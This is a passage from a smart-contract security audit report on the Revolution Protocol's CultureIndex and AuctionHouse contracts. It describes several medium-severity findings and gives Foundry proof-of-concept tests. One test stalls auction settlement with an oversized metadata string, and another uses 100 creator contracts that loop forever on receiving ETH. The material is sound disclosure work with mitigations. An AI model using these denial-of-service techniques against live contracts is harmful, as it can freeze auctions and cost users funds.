Both exploits require a malicious artwork to win the voting, however, as I have mentioned before, the attacker can hide a very long string in an unrelated field of `ArtPieceMetadata` structure, so that users may not even notice this and will only pay attention for the image contained in that artwork.

Alternatively, attacker can buy some `NontransferableERC20Votes` at the beginning and win the voting by himself, before quorum becomes too big.

The impact is severe, but the attack is also costly for the attacker, and under normal circumstances, I would submit the issue as Medium. However, the exploit presented in this submission breaks two invariants that, according to the Sponsor " should NEVER EVER be broken":

*   Anything uploaded to the CultureIndex should always be mintable by the VerbsToken contract and not disrupt the VerbsToken contract in any way.
*   CultureIndex and MaxHeap, must be resilient to DoS attacks that could significantly hinder voting, art creation, or auction processes.

### Proof of Concept

The test I'm showing will simulate a scenario when a malicious user creates a piece of art containing very long data, that piece wins voting and is then sold.

**I assume that the attacker doesn't perform any additional exploits and the bug that I mentioned at the very beginning of this submission is fixed. Moreover, I assume that the attacker specifies only one creator account (if he specified more, he could cause DoS with a less cost - as I have shown in another submission, just by specifying malicious creators he can cause `_settleAuction` to consume additional `~20 000 000` of gas) as I wanted to measure only the impact of a "heavy" NFT on the gas cost**.

The exploit requires a very long string to be passed - for the exploit to be the most destructive, the string would have to be `~1.3MB` long (this will achieve `30 000 000` for the attacker and `~22 000 000` for `_settleAuction`. The string was not explicitly put in the PoC in order to keep this submission smaller - in order to test it, please add a very long string of `\x00`'s in the place tagged with `<- put here a very long string [...]`. It is necessary for the string to only contain `\x00`'s since it will significantly reduce cost for the attacker (as `sreset`, that cost `2900` gas will be used instead of `sset`, which costs `20 000`).

The test will output `3` important values:

*   cost for the attacker
*   cost of performing `_createAuction`
*   cost of performing `_settleAuction`

Please put the following test into `AuctionSettling.t.sol` and run it. Please remember to add a very long string of `\x00`'s in the relevant place:

<details>

```solidity
// create an auction and finish it
    function _createAndFinishAuction() internal returns(uint)
    {
        uint nCreators = 1;
        address[] memory creatorAddresses = new address[](nCreators);
        uint256[] memory creatorBps = new uint256[](nCreators);
        uint256 totalBps = 0;
        address[] memory creators = new address[](nCreators + 1);
        for (uint i = 0; i < nCreators + 1; i++)
        {
            creators[i] = address(uint160(0x1234 + i));
        }

        for (uint256 i = 0; i < nCreators; i++) {
            creatorAddresses[i] = address(creators[i]);
            if (i == nCreators - 1) {
                creatorBps[i] = 10_000 - totalBps;
            } else {
                creatorBps[i] = (10_000) / (nCreators - 1);
            }
            totalBps += creatorBps[i];
        }

        uint gas1 = gasleft();
        uint256 verbId = createArtPieceMultiCreator(
            "Multi Creator Art",
            "An art piece with multiple creators", 
            ICultureIndex.MediaType.IMAGE,
            "ipfs://multi-creator-art",
            "",
            "\x00\x00\x00\x00\x00\x00\x00", // <- put here a very long string (~1.3 MB for _settleAuction to reach 22 000 000 of gas, and ~900 KB for _createAuction to reach block gas limit)
            creatorAddresses,
            creatorBps
        );
        uint gas2 = gasleft();

        vm.startPrank(auction.owner());
        uint gas3 = gasleft();
        auction.unpause();
        uint gas4 = gasleft();
        console.log("gas used for creating auction:", gas3 - gas4);
        vm.stopPrank();

        uint256 bidAmount = auction.reservePrice();
        vm.deal(address(creators[nCreators]), bidAmount + 1 ether);
        vm.startPrank(address(creators[nCreators]));
        auction.createBid{ value: bidAmount }(verbId, address(creators[nCreators]));
        vm.stopPrank();

        vm.warp(block.timestamp + auction.duration() + 1); // Fast forward time to end the auction
        
        // return amount of gas spent by the attacker on creating a piece of art
        return gas1 - gas2;
    }

    function testDOS2() public
    {
        uint gasConsumption1;
        uint gasConsumption2;
        uint gas0;
        uint gas1;

        vm.startPrank(cultureIndex.owner());
        cultureIndex._setQuorumVotesBPS(0);
        vm.stopPrank();

        gasConsumption1 = _createAndFinishAuction();

        gas0 = gasleft();
        auction.settleCurrentAndCreateNewAuction();
        gas1 = gasleft();

        gasConsumption2 = gas0 - gas1;
        console.log("gas used by the attacker: ", gasConsumption1);
        console.log("gas used in settleCurrentAndCreateNewAuction:",gasConsumption2);
    }
```
</details>

### Tools Used

VS Code

### Recommended Mitigation Steps

Limit the length of all fields in `ArtPieceMetadata`.

**[0xTheC0der (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/178#issuecomment-1879685361):**
 > See comment on primary issue: https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195#issuecomment-1879684718

***

## [[M-12] Once EntropyRateBps is set too high, can lead to denial-of-service (DoS) due to an invalid ETH amount](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/160)
*Submitted by [ayden](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/160), also found by [ayden](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/107), [mahdirostami](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/558), [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/509), [KupiaSec](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/465), SpicyMeatball ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/414), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/250)), [ast3ros](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/408), [nmirchev8](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/383), [wangxx2026](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/368), [0xCiphky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/335), [AS](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/306), [fnanni](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/305), [ktg](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/249), [Inference](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/80), [Brenzee](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/65), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/24)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L253#L258> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L400> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/protocol-rewards/src/abstract/RewardSplits.sol#L41>

Once entropy is set too high, the remaining ETH used to invoke `buyToken` is very small, which can lead to the protocol permanently being stuck.

### Proof of Concept

After auction is end someone invoke `settleAuction` or `settleCurrentAndCreateNewAuction` to settle current round and start a new round.
Protocol send some eth to the creator per to `entropyRateBps` [AuctionHouse.sol::\_settleAuction](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L383#L396)

```solidity
if (creatorsShare > 0 && entropyRateBps > 0) {
    for (uint256 i = 0; i < numCreators; i++) {
        ICultureIndex.CreatorBps memory creator = verbs.getArtPieceById(_auction.verbId).creators[i];
        vrgdaReceivers[i] = creator.creator;
        vrgdaSplits[i] = creator.bps;

        //Calculate paymentAmount for specific creator based on BPS splits - same as multiplying by creatorDirectPayment
        uint256 paymentAmount = (creatorsShare * entropyRateBps * creator.bps) / (10_000 * 10_000);
        ethPaidToCreators += paymentAmount;//@audit if there is eth stuck in this contract.

        //Transfer creator's share to the creator
        _safeTransferETHWithFallback(creator.creator, paymentAmount);
    }
}
```

the remaining eth will used to buy token from ERC20TokenEmitter for all the creators [AuctionHouse.sol::\_settleAuction](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L399#L409)

```solidity
if (creatorsShare > ethPaidToCreators) {
    creatorTokensEmitted = erc20TokenEmitter.buyToken{ value: creatorsShare - ethPaidToCreators }(
        vrgdaReceivers,
        vrgdaSplits,
        IERC20TokenEmitter.ProtocolRewardAddresses({
            builder: address(0),
            purchaseReferral: address(0),
            deployer: deployer
        })
    );
}
```

however if the value of `creatorsShare - ethPaidToCreators` is less than `minPurchaseAmount` protocol always revert [RewardSplits.sol::computeTotalReward](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/protocol-rewards/src/abstract/RewardSplits.sol#L40#L52)

```solidity
function computeTotalReward(uint256 paymentAmountWei) public pure returns (uint256) {
    if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();

    return
        (paymentAmountWei * BUILDER_REWARD_BPS) /
        10_000 +
        (paymentAmountWei * PURCHASE_REFERRAL_BPS) /
        10_000 +
        (paymentAmountWei * DEPLOYER_REWARD_BPS) /
        10_000 +
        (paymentAmountWei * REVOLUTION_REWARD_BPS) /
        10_000;
}
```

Assuming ReservePrice is set to 0.005 ether and EntropyRateBps is set to 9999

```solidity
function testEntropyPecentLeadToDos() public {
    //set entropy to 9999
    auction.setEntropyRateBps(9999);
    //set reserve price to 0.005 ether
    auction.setReservePrice(0.005 ether);

    uint256 verbId = createDefaultArtPiece();

    uint256 balance = 1 ether;
    address alice = vm.addr(uint256(1001));
    vm.deal(alice,balance);

    auction.unpause();
    vm.stopPrank();

    vm.prank(alice);
    auction.createBid{value:0.005 ether}(verbId,alice);

    (, , , uint256 endTime, , ) = auction.auction();
    vm.warp(endTime + 1);

    vm.expectRevert(abi.encodeWithSignature("INVALID_ETH_AMOUNT()"));
    auction.settleCurrentAndCreateNewAuction(); 
}
```

output:

```shell
Running 1 test for test/auction/AuctionBasic.t.sol:AuctionHouseBasicTest
[PASS] testEntropyPecentLeadToDos() (gas: 1458836)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.98ms
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Recommend to check `creatorsShare - ethPaidToCreators` is greater than `minPurchaseAmount` before invoke `buytoken`

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/160#issuecomment-1875879365)**

**[0xTheC0der (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/160#issuecomment-1879721399):**
 > Underlying core issue: Owner misconfiguration of `entropyRateBps` and/or `creatorRateBps` (while still within allowed boundaries of setter method) leads to protocol DoS.

***

## [[M-13] It may be possible to DoS AuctionHouse by specifying malicious creators](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/93)
*Submitted by [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/93), also found by [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/182), [Udsen](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/676), [shaka](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/657), [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/602), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/585), [peanuts](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/543), [0xAsen](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/435), [00xSEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/377), [nmirchev8](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/113), [ke1caM](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/101), [Timenov](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/416), [\_eperezok](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/189), and [fnanni](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/310)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L378> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L394> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L400> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L212> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L109> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/NontransferableERC20Votes.sol#L131> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/erc20/ERC20Upgradeable.sol#L232> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/erc20/ERC20VotesUpgradeable.sol#L62> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/VotesUpgradeable.sol#L222> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/VotesUpgradeable.sol#L227> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/VotesUpgradeable.sol#L245-L249>

**Note:** *there is another bug in `AuctionHouse::_settleAuction` that causes DoS (querying `verbs.getArtPieceById` too many times), but this submission describes another issue and from now on, **I assume that `verbs.getArtPieceById` is not called in loop in `_settleAuction`***.

### Brief Description

Malicious user can specify creators of art piece maliciously, so that `AuctionHouse::_settleAuction` will use over `20 000 000` gas units, which is close to the block gas limit (`30 000 000`). If block gas limit is ever decreased in the future or the cost of some operations in EVM increase, this will put `AuctionHouse` in the permanent DoS state as `_settleAuction` will attempt to use more gas than the block gas limit.

### Detailed description

User who calls `CultureIndex::createPiece` can specify up to `100` arbitrary creators, who will get paid if the created piece wins voting and is bought in an auction. The function handling that is called `_settleAuction` and looks like this:

<details>

```solidity
    function _settleAuction() internal {
            [...]
            else verbs.transferFrom(address(this), _auction.bidder, _auction.verbId);


            [...]

                //Transfer creator's share to the creator, for each creator, and build arrays for erc20TokenEmitter.buyToken
                if (creatorsShare > 0 && entropyRateBps > 0) {
                    for (uint256 i = 0; i < numCreators; i++) {
                        [...]

                        //Transfer creator's share to the creator
                        _safeTransferETHWithFallback(creator.creator, paymentAmount);
                    }
                }


                //Buy token from ERC20TokenEmitter for all the creators
                if (creatorsShare > ethPaidToCreators) {
                    creatorTokensEmitted = erc20TokenEmitter.buyToken{ value: creatorsShare - ethPaidToCreators }(
                        vrgdaReceivers,
                        vrgdaSplits,
                        IERC20TokenEmitter.ProtocolRewardAddresses({
                            builder: address(0),
                            purchaseReferral: address(0),
                            deployer: deployer
                        })
                    );
                }
            }
        }
        [...]
```
</details>

As can be seen, it performs several external transactions. The most important are (I purposely ignore `verbs.getArtPieceById` here as the issue addresses malicious creators only):

*   `_safeTransferETHWithFallback(creator.creator, paymentAmount)`
*   `creatorTokensEmitted = erc20TokenEmitter.buyToken`

In order to make `_settleAuction` as costly as possible, attacker can do several things:

*   Specify as many creators as possible (`100`).
*   Consume as much gas as possible in `receive()` of all of these creators.
*   Make each creator different, so that `sset` operations performed later in the code change `0` to nonzero entries (so that it costs `20000` per word instead of `2900`, for `sreset`).

Since `_safeTransferETHWithFallback` specifies `50 000` gas in a call, each such call will cost `> 50 000 + 9 000 = 59 000` gas (`9 000` for `callvalue` operation). Since the number of creators can be `100`, it will use over `5 900 000` gas by itself (including cost for converting `ETH` to `WETH` and sending it each time).

I will not analyse each memory reads and writes here (I tried to specify the most important places in the "Links to affected code" section of this submission), but another "heavy" function, in terms of gas usage is `erc20TokenEmitter.buyToken` as it will update users' balances (change from `0` to nonzero) and the same will happen for their voting power.

From the tests I have made (see PoC), it follows that attacker can cause `settleCurrentAndCreateNewAuction` (that calls `_settleAuction`) to use over `20 000 000` gas units.

### Impact

If the attack is able to cause `_settleAuction` to reach block gas limit, `AuctionHouse` will be DoSed as it won't be possible to settle auctions.

While it's not the case at the moment (attacker can now reach `20 000 000`), I will now demonstrate why it's problematic even right now:

*   Ethereum / Base / Optimism block gas limit can change in the future; if it's decreased, it will be possible to DoS `AuctionHouse`
*   EVM operations' cost can change - **it is not a hypothetical scenario**: for example the cost of `sload` increased from `50` to `2100` (or `100` in case of warm access) from the frontier hardfork (see [frontier](https://ethereum.github.io/execution-specs/autoapi/ethereum/frontier/vm/gas/index.html?gas-sload#gas-sload) and [shanghai](https://ethereum.github.io/execution-specs/autoapi/ethereum/shanghai/vm/gas/index.html?gas-cold-sload#gas-cold-sload))

Since EVM operations' gas cost increase is a real scenario that has happened in the past and the end effect is severe (DoS of `AuctionHouse`), but the attack is:

*   Not yet possible (it is in fact possible combined with another exploit of specifying a very "heavy" NFT that I will describe in another submission, not to mention the bug about calling `getArtPieceById` that I mentioned earlier), but it will already harm user who calls `_settleAuction` as he will have to pay a lot for the gas.
*   In order for the attack to be performed, attacker would have to win the voting first.

Hence, I believe that Medium severity is appropriate for this issue.

### Proof of Concept

First of all, please modify the code in the `AuctionHouse::_settleAuction` in the following way:

*   Replace `ICultureIndex.CreatorBps memory creator = verbs.getArtPieceById(_auction.verbId).creators[i];` with `ICultureIndex.CreatorBps memory creator = artPiece.creators[i];`.
*   Put `ICultureIndex.ArtPiece memory artPiece = verbs.getArtPieceById(_auction.verbId);` right before `if (creatorsShare > 0 && entropyRateBps > 0) {`.

**It is a fix for another bug that is in the `_settleAuction` and since this submission describes another attack vector, we have to fix it first (as otherwise it won't be possible to calculate precisely the impact of the described attack)**.

Then, please put the following contract definition in `AuctionSettling.t.sol`:

```solidity
contract InfiniteLoop
{
    receive() external payable
    {
        while (true)
        {

        }
    }
}
```

Then, please put the following code in `AuctionSettling.t.sol` and run the test (`import "forge-std/console.sol";` will be needed as well):

<details>

```solidity
    // this function creates an auction and wait for its finish
    // if `toDoS` is true, it will create `100` creators and each creator will be a malicious contract that will
    // run an infinite loop in its `receive()`
    // if `toDoS` is false, it will create only `1` "honest" creator
    function _createAndFinishAuction(bool toDoS) internal
    {
        uint nCreators = toDoS ? 100 : 1;
        address[] memory creatorAddresses = new address[](nCreators);
        uint256[] memory creatorBps = new uint256[](nCreators);
        uint256 totalBps = 0;
        address[] memory creators = new address[](nCreators + 1);
        for (uint i = 0; i < nCreators + 1; i++)
        {
            if (toDoS)
                creators[i] = address(new InfiniteLoop());
            else
                creators[i] = address(uint160(0x1234 + i));
        }

        for (uint256 i = 0; i < nCreators; i++) {
            creatorAddresses[i] = address(creators[i]);
            if (i == nCreators - 1) {
                creatorBps[i] = 10_000 - totalBps;
            } else {
                creatorBps[i] = (10_000) / (nCreators - 1);
            }
            totalBps += creatorBps[i];
        }

        uint256 verbId = createArtPieceMultiCreator(
            "Multi Creator Art",
            "An art piece with multiple creators",
            ICultureIndex.MediaType.IMAGE,
            "ipfs://multi-creator-art",
            "",
            "",
            creatorAddresses,
            creatorBps
        );

        vm.startPrank(auction.owner());
        auction.unpause();
        vm.stopPrank();

        uint256 bidAmount = auction.reservePrice();
        vm.deal(address(creators[nCreators]), bidAmount + 1 ether);
        vm.startPrank(address(creators[nCreators]));
        auction.createBid{ value: bidAmount }(verbId, address(creators[nCreators]));
        vm.stopPrank();

        vm.warp(block.timestamp + auction.duration() + 1); // Fast forward time to end the auction
    }

    function testDOS() public
    {
        uint gasConsumption1;
        uint gasConsumption2;
        uint gas0;
        uint gas1;

        vm.startPrank(cultureIndex.owner());
        cultureIndex._setQuorumVotesBPS(0);
        vm.stopPrank();

        _createAndFinishAuction(true);

        gas0 = gasleft();
        auction.settleCurrentAndCreateNewAuction();
        gas1 = gasleft();
        // we calculate gas consumption in case of `100` malicious creators
        gasConsumption1 = gas0 - gas1;

        _createAndFinishAuction(false);

        gas0 = gasleft();
        auction.settleCurrentAndCreateNewAuction();
        gas1 = gasleft();
        // we calculate gas consumption in case of `1` "honest" creator
        gasConsumption2 = gas0 - gas1;

        console.log("Gas consumption difference =", gasConsumption1 - gasConsumption2);
    }
```
</details>

It will output a value `~20 500 000` as a gas difference between the use with one "honest" creator and `100` malicious creators when `settleCurrentAndCreateNewAuction` is called.

### Tools Used

VS Code

### Recommended Mitigation Steps

Consider limiting the number of creators that may be specified.

Alternatively, don't distribute `ETH` and `ERC20` tokens to creators in `_settleAuction` - instead let them receive their rewards in a separate function (for example, called `claimRewards`), that one of them will call, independently from `_settleAuction`.

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/93#issuecomment-1879687734):**
 > See comment on primary issue: https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195#issuecomment-1879684718

***

## [[M-14] `encodedData` argument of `hashStruct` is not calculated perfectly for EIP712 singed messages in `CultureIndex.sol`](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/77)
*Submitted by [Aamir](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/77), also found by [shaka](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/658), [0xCiphky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/336), [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/271), [SovaSlava](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/206), [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/54), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/20)*

Encoding of `encodedData` is not done correctly for the verification of EIP712 signed messages.

### Impact

`CultureIndex::_verifyVoteSignature()` is called by other functions like `CultureIndex::voteForManyWithSig()` and `CultureIndex::batchVoteForManyWithSig()` for the verification of the signed messages in order to cast vote. But the encoding of `hashStruct` is not done correctly in the function.

```solidity
    function _verifyVoteSignature(
        address from,
        uint256[] calldata pieceIds,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (bool success) {
        require(deadline >= block.timestamp, "Signature expired");

        bytes32 voteHash;

@>        voteHash = keccak256(abi.encode(VOTE_TYPEHASH, from, pieceIds, nonces[from]++, deadline));

        bytes32 digest = _hashTypedDataV4(voteHash);

        address recoveredAddress = ecrecover(digest, v, r, s);

        // Ensure to address is not 0
        // @audit check this in the beginning
        if (from == address(0)) revert ADDRESS_ZERO();

        // Ensure signature is valid
        if (recoveredAddress == address(0) || recoveredAddress != from) revert INVALID_SIGNATURE();

        return true;
    }
```

`hashStruct` is combination of two things. `typeHash` and `encodedData`. Read more [here](https://eips.ethereum.org/EIPS/eip-712#definition-of-hashstruct).

```text
hashStruct(s : 𝕊) = keccak256(typeHash ‖ encodeData(s))
```

If any one of them is constructed in a wrong way then the verification will not work.

In `CultureIndex::_verifyVoteSignature()`, `typeHash` is calculated like this which is correct:

```solidity
bytes32 public constant VOTE_TYPEHASH =
        keccak256("Vote(address from,uint256[] pieceIds,uint256 nonce,uint256 deadline)");
```

But `encodedData` is not right. According to EIP712, the encoding of array should be done like this before hashing the struct data:

> The array values are encoded as the keccak256 hash of the concatenated encodeData of their contents (i.e. the encoding of SomeType\[5] is identical to that of a struct containing five members of type SomeType).

Read More [here](https://eips.ethereum.org/EIPS/eip-712#definition-of-encodedata)

But in `CultureIndex::_verifyVoteSignature()`, simply `pieceIds` is passed to `keccak256` to calculate the struct hash. This will result in the improper functioning of the function and will not let anybody to cast vote.

### Proof of Concept

All of the link mentioned above. Also Read [this](https://ethereum.stackexchange.com/questions/125105/signing-an-array-whit-eth-signtypeddata-v) Ethereum exchange conversation.

### Recommended Mitigation Steps

Use `keccak256` hash of the `pieceIds` before constructing the struct hash.

<details>

```diff
    function _verifyVoteSignature(
        address from,
        uint256[] calldata pieceIds,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (bool success) {
        require(deadline >= block.timestamp, "Signature expired");

        bytes32 voteHash;

        // @audit shouldn't this use keccak256 hash of the pieceIds?
-        voteHash = keccak256(abi.encode(VOTE_TYPEHASH, from, pieceIds, nonces[from]++, deadline));
+        voteHash = keccak256(abi.encode(VOTE_TYPEHASH, from, keccak256(abi.encodePacked(pieceIds), nonces[from]++, deadline));

        bytes32 digest = _hashTypedDataV4(voteHash);

        address recoveredAddress = ecrecover(digest, v, r, s);

        // Ensure to address is not 0
        // @audit check this in the beginning
        if (from == address(0)) revert ADDRESS_ZERO();

        // Ensure signature is valid
        if (recoveredAddress == address(0) || recoveredAddress != from) revert INVALID_SIGNATURE();

        return true;
    }
```
</details>

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/77#issuecomment-1883281013)**

***

# Low Risk and Non-Critical Issues

For this audit, 34 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/161) by **0xmystery** received the top score from the judge.

*The following wardens also submitted reports: [sivanesh\_808](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/574), [peanuts](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/549), [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/541), [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/44), [Pechenite](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/730), [Ward](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/720), [IllIllI](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/687), [cheatc0d3](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/681), [spacelord47](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/674), [MrPotatoMagic](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/659), [shaka](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/649), [Aamir](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/643), [developerjordy](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/610), [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/590), [0xhitman](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/587), [kaveyjoe](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/572), [BARW](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/562), [imare](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/530), [King\_](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/430), [ast3ros](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/413), [ZanyBonzy](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/385), [00xSEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/379), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/376), [0xCiphky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/341), [roland](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/286), [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/261), [ktg](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/260), [Topmark](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/222), [leegh](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/221), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/185), [SovaSlava](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/149), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/76), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/22).*

## [01] Callers/buyers can control `protocolRewardsRecipients` to receive self-rebates
The `ERC20TokenEmitter.buyToken()` function is designed in such a way that the caller (or buyer) can fully control the `protocolRewardsRecipients` parameter, which includes the `builder`, `purchaseReferral`, and `deployer` addresses. This design allows the caller to potentially assign all these addresses to themselves.

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/ERC20TokenEmitter.sol#L152-L170

```solidity
    function buyToken(
        address[] calldata addresses,
        uint[] calldata basisPointSplits,
        ProtocolRewardAddresses calldata protocolRewardsRecipients
    ) public payable nonReentrant whenNotPaused returns (uint256 tokensSoldWad) {
        //prevent treasury from paying itself
        require(msg.sender != treasury && msg.sender != creatorsAddress, "Funds recipient cannot buy tokens");

        require(msg.value > 0, "Must send ether");
        // ensure the same number of addresses and bps
        require(addresses.length == basisPointSplits.length, "Parallel arrays required");

        // Get value left after protocol rewards
        uint256 msgValueRemaining = _handleRewardsAndGetValueToSend(
            msg.value,
            protocolRewardsRecipients.builder,
            protocolRewardsRecipients.purchaseReferral,
            protocolRewardsRecipients.deployer
        );
```
Given this setup, if a caller assigns all three addresses (builder, purchaseReferral, deployer) to themselves, they could indeed benefit from the rewards percentages assigned to each of these roles. In the code, the basis points (BPS) for each reward are defined as constants:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/protocol-rewards/src/abstract/RewardSplits.sol#L17-L21

- BUILDER\_REWARD\_BPS = 100 BPS (0.1%)
- PURCHASE\_REFERRAL\_BPS = 50 BPS (0.05%)
- DEPLOYER\_REWARD\_BPS = 25 BPS (0.025%)

When summed up, these total to 1.75% (175 BPS). So, if the buyer sets themselves as the recipient for all these rewards, they would effectively be receiving a 1.75% reward on their purchase value.

This could be a feature or a vulnerability, depending on the intended use and design of the contract:

1. **Feature**: If this mechanism is intentional, it might be designed to incentivize certain behaviors, like encouraging users to participate more actively in the ecosystem or rewarding them for different roles they play.
2. **Vulnerability**: If this was not an intended use case, it could be exploited by users to unjustly reward themselves, undermining the fairness of the reward distribution system.

